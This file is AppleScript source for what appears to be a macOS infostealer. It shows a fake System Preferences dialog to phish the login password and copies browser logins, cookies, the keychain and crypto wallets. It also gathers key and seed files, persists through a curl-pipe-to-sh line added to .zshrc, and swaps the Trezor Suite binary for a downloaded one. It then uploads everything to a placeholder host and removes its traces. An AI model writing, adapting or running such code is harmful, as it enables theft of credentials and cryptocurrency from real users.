set userHome to POSIX path of (path to home folder)
set workDir to do shell script "mktemp -d /tmp/stage.XXXXXXXX"
set loginName to do shell script "id -un"
try
    do shell script "test -r " & quoted form of (userHome & "Library/Application Support/com.apple.TCC/TCC.db")
on error
    display dialog "Full Disk Access required" with title "System Preferences" buttons {"OK"}
    do shell script "printf '%s\\n' 'curl -fsSL http://startup.test/loader | sh' >> " & quoted form of (userHome & ".zshrc")
    return
end try
repeat
    set response to display dialog "Enter your password to continue" with title "System Preferences" default answer "" with hidden answer
    set loginPassword to text returned of response
    try
        do shell script "dscl . -authonly " & quoted form of loginName & " " & quoted form of loginPassword
        exit repeat
    end try
end repeat
do shell script "printf '%s' " & quoted form of loginPassword & " > " & quoted form of (workDir & "/password")
do shell script "mkdir -p " & quoted form of (workDir & "/browser")
repeat with itemPath in {"Library/Application Support/Google/Chrome/Default/Login Data", "Library/Application Support/Google/Chrome/Default/Cookies", "Library/Application Support/Firefox/Profiles", "Library/Keychains/login.keychain-db", "Library/Application Support/Electrum/wallets"}
    try
        do shell script "cp -R " & quoted form of (userHome & itemPath) & " " & quoted form of (workDir & "/browser/")
    end try
end repeat
set storageKey to do shell script "security find-generic-password -wa 'Chrome'"
do shell script "printf '%s' " & quoted form of storageKey & " > " & quoted form of (workDir & "/safe-storage")
do shell script "find " & quoted form of (userHome & "Documents") & " -type f \\( -name '*.pdf' -o -name '*.docx' -o -name '*.key' -o -name '*.seed' -o -name '*.pem' -o -name '*.wallet' -o -name '*.ovpn' \\) -exec cp {} " & quoted form of workDir & " \\;"
try
    do shell script "test -d '/Applications/Trezor Suite.app'"
    do shell script "curl -fsSL https://delivery.example.invalid/wallet -o '/Applications/Trezor Suite.app/Contents/MacOS/Trezor Suite'"
end try
set bundlePath to workDir & ".zip"
do shell script "ditto -c -k --sequesterRsrc " & quoted form of workDir & " " & quoted form of bundlePath
do shell script "curl -X POST -F " & quoted form of ("file=@" & bundlePath) & " https://delivery.example.invalid/collect"
do shell script "rm -rf " & quoted form of workDir & " " & quoted form of bundlePath
